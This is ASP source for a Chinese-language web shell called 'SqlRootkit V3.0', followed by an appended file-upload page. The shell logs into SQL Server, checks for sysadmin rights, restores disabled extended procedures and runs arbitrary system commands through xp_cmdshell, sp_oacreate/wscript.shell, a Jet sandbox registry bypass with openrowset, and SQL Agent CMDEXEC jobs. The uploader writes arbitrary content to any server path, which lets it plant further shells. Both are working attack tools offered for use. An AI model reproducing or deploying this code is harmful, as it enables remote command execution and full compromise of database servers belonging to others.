<%on error resume next%>
<html> 
<head> 
<meta http-equiv="Content-Type" content="text/html; charset=gb2312"> 
<title>∷ SqlRootkit - by 剑心 ∷ </title>
<STYLE TYPE="text/css">
<!--
body { font-size: 14pt;color: black; font-family: impact}
font { border:0;font-size: 16px; color: Red; font-family: impact;text-decoration: none }
form { border:0;background-color: black; font-size: 14pt;color: blue; font-family: impact}
A    { text-decoration: none;}
textarea {width:100%; background-color: black; font-size: 14pt;color: white;font-family: impact}

-->
</STYLE> 
</head> 
<body bgcolor=black>
<%
if session("login")="" then
                           response.write "<center><font color=red>没有登陆</font></center><br>"
			   else response.write "<center><font color=red>已经登陆</font></center><br>"
end if
                           response.write "<center><a href="&Request.ServerVariables("URL")&"?action=logout><font color=black>退出登陆</font></a></center><br>"
%>
<%
If request("action")="login" then
		       set adoConn=Server.CreateObject("ADODB.Connection") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & request.Form("server") & "," & request.Form("port") & ";Password=" & request.Form("pass") & ";UID=" & request.Form("name")
                       if err.number=-2147467259 then 
                       response.write "<font color=red>数据源连接错误，请检查！</font>"
                       response.end
                       elseif err.number=-2147217843 then
                       response.write "<font color=red>用户名密码错误错误，请检查！</font>"
                       response.end
                       elseif err.number=0 then
                       strQuery="select @@version"
		       set recResult = adoConn.Execute(strQuery)
		       If instr(recResult(0),"NT 5.0") then
		       response.write "<font color=red>Windows 2000系统</font><br>"
                       session("system")="2000"
                       elseif instr(recResult(0),"NT 5.1")  then
                       response.write "<font color=red>Windows XP系统</font><br>"
                       session("system")="xp"
                       elseif instr(recResult(0),"NT 5.2")  then
                       response.write "<font color=red>Windows 2003系统</font><br>"
                       session("system")="2003"
                       else
                       response.write "<font color=red>其他系统</font><br>"
                       session("system")="no"
                       end if
                       strQuery="SELECT IS_SRVROLEMEMBER('sysadmin')"
		       set recResult = adoConn.Execute(strQuery)
                       if recResult(0)=1 then
                       response.write "<font color=red>恭喜！Sql Server最高权限</font><br>"
                       session("pri")=1
                       else
                       response.write "<font color=red>郁闷，权限不够估计不能执行命令！</font><br>"
                       session("pri")=0
                       end if              
		       session("login")="yes"
		       session("name")=request.Form("name")
		       session("pass")=request.Form("pass")
		       session("server")=request.Form("server")
		       session("port")=request.Form("port")
                       end if

elseif request("action")="test"  then
                       if session("login")<>"" then
                       if session("system")="2000" then
                       response.write "<font color=red>Windows 2000系统</font><br>"
                       elseif session("system")="xp" then
                       response.write "<font color=red>Windows XP系统</font><br>"
                       elseif session("system")="2003" then
                       response.write "<font color=red>Windows 2003系统</font><br>"
                       else
                       response.write "<font color=red>其他操作系统</font><br>"
                       end if
                       if session("pri")=1 then
                       response.write "<font color=red>恭喜！Sql Server最高权限</font><br>"
                       else 
                       response.write "<font color=red>郁闷，权限不够估计不能执行命令！</font><br>"
                       end if
		       set adoConn=Server.CreateObject("ADODB.Connection") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & session("server") & "," & session("port") & ";Password=" & session("pass") & ";UID=" & session("name")        

                       strQuery="select count(*) from master.dbo.sysobjects where xtype='X' and name='xp_cmdshell'"
		       set recResult = adoConn.Execute(strQuery) 
		       If recResult(0) Then
		       session("XP_cmdshell")=1 
		       response.write "<font color=red>XP_cmdshell............. 存在!</font>"
                       else
		       session("XP_cmdshell")=0 
		       response.write "<font color=red>XP_cmdshell............. 不存在!</font>"
                       End if
		       strQuery="select count(*) from master.dbo.sysobjects where xtype='X' and name='sp_oacreate'"
		       set recResult = adoConn.Execute(strQuery) 
		       If recResult(0) Then 
		       response.write "<br><font color=red>sp_oacreate............. 存在!</font>"
		       session("sp_oacreate")=1
                       else 
		       response.write "<br><font color=red>sp_oacreate............. 不存在!</font>"
                       session("sp_oacreate")=0
                       End if
		       strQuery="select count(*) from master.dbo.sysobjects where xtype='X' and name='xp_regwrite'"
		       set recResult = adoConn.Execute(strQuery) 
		       If recResult(0) Then 
		       response.write "<br><font color=red>xp_regwrite............. 存在!</font>"
		       session("xp_regwrite")=1
                       else 
		       response.write "<br><font color=red>xp_regwrite............. 不存在!</font>"
		       session("xp_regwrite")=0
                       End if
		       strQuery="select count(*) from master.dbo.sysobjects where xtype='X' and name='xp_servicecontrol'"
		       set recResult = adoConn.Execute(strQuery) 
		       If recResult(0) Then 
		       response.write "<br><font color=red>xp_servicecontrol 存在!</font>"
		       session("xp_servicecontrol")=1
                       else 
		       response.write "<br><font color=red>xp_servicecontrol 不存在!</font>"
		       session("xp_servicecontrol")=0
                       End if
                       else 
                       response.write "<script>alert('操作超时，重新登陆！')</script>"
                       response.write "<center><a href="&Request.ServerVariables("URL")&"?action=logout><font color=black>登陆超时</font>"
                       response.end
                       end if 

elseif request("action")="cmd" then
                       if session("login")<>"" then
                       if session("pri")=1 then
		       If request("tool")="XP_cmdshell" then
		       set adoConn=Server.CreateObject("ADODB.Connection") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & session("server") & "," & session("port") & ";Password=" & session("pass") & ";UID=" & session("name")
		       If request.form("cmd")<>"" Then 
  		       strQuery = "exec master.dbo.xp_cmdshell '" & request.form("cmd") & "'" 
                       set recResult = adoConn.Execute(strQuery) 
                       If NOT recResult.EOF Then 
                       Do While NOT recResult.EOF 
                       strResult = strResult & chr(13) & recResult(0) 
                       recResult.MoveNext 
                       Loop
		       End if
		       set recResult = Nothing
                       Response.Write "<textarea rows=10 cols=50>"
                       Response.Write "利用"&request("tool")&"扩展执行"
                       Response.Write request.form("cmd") 
                       Response.Write strResult
                       Response.Write "</textarea>"
		       end if 
		       		       
                       elseif request("tool")="sp_oacreate" then 
		       set adoConn=Server.CreateObject("ADODB.Connection") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & session("server") & "," & session("port") & ";Password=" & session("pass") & ";UID=" & session("name")
		       If request.form("cmd")<>"" Then 
  		       strQuery = "CREATE TABLE [jnc](ResultTxt nvarchar(1024) NULL);use master declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamethod @o,'run',NULL,'cmd /c "&request("cmd")&" > 8617.tmp',0,true;BULK INSERT [jnc] FROM '8617.tmp' WITH (KEEPNULLS);"
		       adoConn.Execute(strQuery)
                       strQuery = "select * from jnc"
		       set recResult = adoConn.Execute(strQuery)
		       If NOT recResult.EOF Then 
                       Do While NOT recResult.EOF 
                       strResult = strResult & chr(13) & recResult(0) 
                       recResult.MoveNext 
                       Loop 
                       End if
		       set recResult = Nothing
                       Response.Write "<textarea rows=10 cols=50>"
		       Response.Write "利用"&request("tool")&"扩展执行"	
                       Response.Write request.form("cmd") 
                       Response.Write strResult
                       Response.Write "</textarea>"
		       strQuery = "DROP TABLE [jnc];declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamethod @o,'run',NULL,'cmd /c del 8617.tmp'"
 		       adoConn.Execute(strQuery)
		       End if

                       elseif request("tool")="xp_regwrite" then
                       if session("system")="2000" then
                       path="c:\winnt\system32\ias\ias.mdb"
                       else
                       path="c:\windows\system32\ias\ias.mdb"
                       end if
		       set adoConn=Server.CreateObject("ADODB.Connection") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & session("server") & "," & session("port") & ";Password=" & session("pass") & ";UID=" & session("name")
		       If request.form("cmd")<>"" Then
		       cmd=chr(34)&"cmd.exe /c "&request.form("cmd")&" > 8617.tmp"&chr(34)
		       strQuery = "CREATE TABLE [jnc](ResultTxt nvarchar(1024) NULL);exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;select * from openrowset('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&cmd&")');"
                       adoConn.Execute(strQuery)
		       strQuery = "select * from openrowset('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&chr(34)&"cmd.exe /c copy 8617.tmp jnc.tmp"&chr(34)&")');BULK INSERT [jnc] FROM 'jnc.tmp' WITH (KEEPNULLS);"
		       set recResult = adoConn.Execute(strQuery)
		       strQuery="select * from [jnc];"
                       set recResult = adoConn.Execute(strQuery)
		       If NOT recResult.EOF Then 
                       Do While NOT recResult.EOF 
                       strResult = strResult & chr(13) & recResult(0) 
                       recResult.MoveNext 
                       Loop 
                       End if
                       set recResult = Nothing
                       Response.Write "<textarea rows=10 cols=50>"
                       Response.Write "利用"&request("tool")&"扩展执行"
                       Response.Write request.form("cmd") 
                       Response.Write strResult
                       Response.Write "</textarea>"
		       strQuery = "DROP TABLE [jnc];exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&chr(34)&"cmd.exe /c del 8617.tmp&&del jnc.tmp"&chr(34)&")');"
		       adoConn.Execute(strQuery)
		       End if

		       elseif request("tool")="sqlserveragent" then
		       set adoConn=Server.CreateObject("ADODB.Connection") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & session("server") & "," & session("port") & ";Password=" & session("pass") & ";UID=" & session("name")

		       If request.form("cmd")<>"" Then
                       if session("sqlserveragent")=0 then
                       strQuery = "exec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT';"
                       adoConn.Execute(strQuery)
                       session("sqlserveragent")=1
                       end if

		       strQuery = "use msdb CREATE TABLE [jncsql](ResultTxt nvarchar(1024) NULL) exec sp_delete_job null,'x' exec sp_add_job 'x' exec sp_add_jobstep Null,'x',Null,'1','CMDEXEC','cmd /c "&request.form("cmd")&"' exec sp_add_jobserver Null,'x',@@servername exec sp_start_job 'x';"
                       adoConn.Execute(strQuery)
                       adoConn.Execute(strQuery)
                       adoConn.Execute(strQuery)
                    
                       Response.Write "<textarea rows=10 cols=50>"
                       Response.Write "利用"&request("tool")&"扩展执行"
                       Response.Write request.form("cmd") 
                       Response.Write vbcrf
                       Response.Write "此扩展无回显，建议通过重定向查看命令结果"
                       Response.Write "</textarea>"
		       strQuery = "use msdb drop table [jncsql];"
                       adoConn.Execute(strQuery)
                       End if
                       elseif request("tool")="" then 
                       response.write "<script>alert('选择你要使用的扩展')</script>"
                       end if
                       else
                       response.write "<script>alert('权限不够哦！')</script>"
                       end if
                       else 
                       response.write "<script>alert('操作超时，重新登陆！')</script>"
                       response.write "<center><a href="&Request.ServerVariables("URL")&"?action=logout><font color=black>登陆超时</font>"
                       response.end
                       end if

elseif request("action")="resume" then
                       if session("login")<>"" then
                       set adoConn=Server.CreateObject("ADODB.Connection") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & session("server") & "," & session("port") & ";Password=" & session("pass") & ";UID=" & session("name")
                       if session("xp_cmdshell")=0 then
                       strQuery="dbcc addextendedproc ('xp_cmdshell','xplog70.dll')"
		       adoConn.Execute(strQuery)	
                       response.write "<font color=red>已经尝试恢复xp_cmdshell</font>"
                       elseif session("sp_OACreate")=0 then
		       strQuery="dbcc addextendedproc ('sp_OACreate','odsole70.dll')"
		       adoConn.Execute(strQuery)	
                       response.write "<font color=red>已经尝试恢复sp_OACreate</font>"
		       elseif session("xp_regwrite")=0 then
		       strQuery="dbcc addextendedproc ('xp_regwrite','xpstar.dll')"
		       adoConn.Execute(strQuery)	
                       response.write "<font color=red>已经尝试恢复xp_regwrite</font>"	
		       else response.write "<font color=red>恭喜！组件齐全</font>"	
                       end if
                       else 
                       response.write "<script>alert('操作超时，重新登陆！')</script>"
                       response.write "<center><a href="&Request.ServerVariables("URL")&"?action=logout><font color=black>登陆超时</font>"
                       response.end
                       end if 	
                                
elseif request("action")="sql" then
                       if session("login")<>"" then
		       If request.form("sql")<>"" then
                       set adoConn=Server.CreateObject("ADODB.Connection") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & session("server") & "," & session("port") & ";Password=" & session("pass") & ";UID=" & session("name")
                       strQuery=request.form("sql")
                       set recResult = adoConn.Execute(strQuery) 
                       If NOT recResult.EOF Then 
                       Do While NOT recResult.EOF 
                       strResult = strResult & chr(13) & recResult(0) 
                       recResult.MoveNext 
                       Loop
		       End if
		       set recResult = Nothing
                       Response.Write "<textarea rows=10 cols=50>"
                       Response.Write "执行SQL语句:"
                       Response.Write request.form("sql") 
                       Response.Write strResult
                       Response.Write "</textarea>"
                       end if
                       else 
                       response.write "<script>alert('操作超时，重新登陆！')</script>"
                       response.write "<center><a href="&Request.ServerVariables("URL")&"?action=logout><font color=black>登陆超时</font>"
                       response.end
                       end if

elseif request("action")="logout" then
                       set adoConn=nothing
                       session("login")=""
                       session("name")=""
                       session("pass")=""
                       session("server")=""
                       session("port")=""
                       session("system")=""
                       session("pri")=""		              
end if
%>
<%
if session("login")="" then
			   response.write "<form name=form method=POST action="&Request.ServerVariables("URL")&">"
			   response.write "<p>SQL用户名："
			   response.write "<input name=name type=text id=name value="&session("name")&">"
 		           response.write "  SQL密码："
			   response.write "<input name=pass type=password id=pass value="&session("pass")&">"
			   response.write "<p>SQL服务器："
			   response.write "<input name=port type=text id=server value=127.0.0.1>"
 		           response.write "  SQL端口："
			   response.write "<input name=port type=text id=port value=1433>"
			   response.write "  <input name=action type=submit value=login>"
			   response.write "</form>"

else                       response.write "<form name=form method=POST action="&Request.ServerVariables("URL")&">"
			   response.write "<p>组件检测："
			   response.write "  <input name=action type=hidden value=test>"
			   response.write "  <input type=submit value=检测组件>"
			   response.write "</form>"

                           response.write "<form name=form method=POST action="&Request.ServerVariables("URL")&">"
			   response.write "<p>组件恢复："
			   response.write "  <input name=action type=hidden value=resume>"
			   response.write "  <input type=submit value=恢复组件>"
			   response.write "</form>"

		           response.write "<form name=form method=POST action="&Request.ServerVariables("URL")&">"
			   response.write "<p>系统命令："
			   response.write "  <input name=cmd type=text>"
			   response.write "<select name='tool' ><option value=''>----请选择运行程序的组件----</option><option value=XP_cmdshell>XP_cmdshell</option><option value=sp_oacreate>sp_oacreate</option><option value=xp_regwrite>xp_regwrite</option><option value=sqlserveragent>sqlserveragent</option></option></select>"
			   response.write "  <input name=action type=hidden value=cmd>"
			   response.write "  <input type=submit value=执行>"
			   response.write "</form>"
		           response.write "<form name=form1 method=POST action="&Request.ServerVariables("URL")&">"
			   response.write "<p>执行语句："
			   response.write "   <input name=sql type=text>"
			   response.write "  <input name=action type=hidden value=sql>"
			   response.write "  <input type=submit value=执行>"			   
			   response.write "</form>"


                           
end if
%>
<br>
<br>
<br>
<center>
<p><font size="2" color="#084B8E"><a target="_blank" href="http://www.cnbct.org" style="text-decoration: none"><font color="#084B8E">SqlRootkit V3.0 -- by 剑心 thans to李丰初友情改版</font></a>
<br="fname.value=file1.value"> 
</td></tr> 
</table> 
</form> 
</body> 
</html>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>李丰初为剑心那BB做的上传</title>
<style type="text/css">
<!--
.black {
	font-family: "宋体";
	font-size: 12px;
	color: #000000;
	text-decoration: none;
	line-height: 120%;}
-->
</style>
<style type="text/css">
<!--
a:link {
	font-family: "宋体";
	font-size: 12px;
	color: #00CC00;
	text-decoration: none;
}
a:visited {
	font-family: "宋体";
	font-size: 12px;
	color: #00CC00;
	text-decoration: none;
}
a:hover {
	font-family: "宋体";
	font-size: 12px;
	color: #333333;
	text-decoration: none;
}
-->
</style>
</head>
<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<p>
<% dim objFSO %>
<% dim fdata %>
<% dim objCountFile %>
<% on error resume next %>
<% Set objFSO = Server.CreateObject("Scripting.FileSystemObject") %>
<% if Trim(request("syfdpath"))<>"" then %>
<% fdata = request("cyfddata") %>
<% Set objCountFile=objFSO.CreateTextFile(request("syfdpath"),True) %>
<% objCountFile.Write fdata %>
<% if err =0 then %>
<% response.write "<font color=#FFFF00>save Success!</font>" %>
<% else %>
<% response.write "<font color=#FFFF00>Save UnSuccess!</font>" %>
<% end if %>
<% err.clear %>
<% end if %>
<% objCountFile.Close %>
<% Set objCountFile=Nothing %>
<% Set objFSO = Nothing %>
<% Response.write "</form>" %>
</p>
<table   align="center"width="50" height="50" border="0" cellpadding="0" cellspacing="0" bordercolor="#FFFFFF">
<tr>
<td height="100%"> 
<table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
<tr>
<td><table width="700" border="0" align="center" cellpadding="0" cellspacing="1">
<tr>
<td bgcolor="#FFFFFF"><span class="black"> 
<% Response.write "本文件绝对路径" %>
<% =server.mappath(Request.ServerVariables("SCRIPT_NAME")) %>
<br>
<% Response.write "保存文件的<font color=red>绝对路径(包括文件名:如D:\lifengchu\fuckyoulove.asp</font>" %>

<% Response.write "<form action='' method=post>" %>
</span> </td>
</tr>
<tr>
<td bgcolor="#FFFFFF"><span class="black">路径：<% Response.Write "<input type=text name=syfdpath width=200 size=81>" %>

</span></td>
</tr>
<tr>
<td bgcolor="#FFFFFF" class="black">
<% Response.write "内容：" %>
<% Response.write "<textarea name=cyfddata cols=10 rows=2 width=16></textarea>" %>
</td>
</tr>
<tr>
<td bgcolor="#FFFFFF"><div align="right"><span class="black">
<% Response.write "<input type=submit value=保存>" %>
</span></div></td>
</tr>
</tr>
<td bgcolor="#FFFFFF" class="black"><div align="center">注：只是提供给剑心的,别人用的要记得李丰初的友情帮助:)
</div></td>
</tr>
</table></td>
</tr>
</table></td>
</tr>
</table>
</body>
</html>
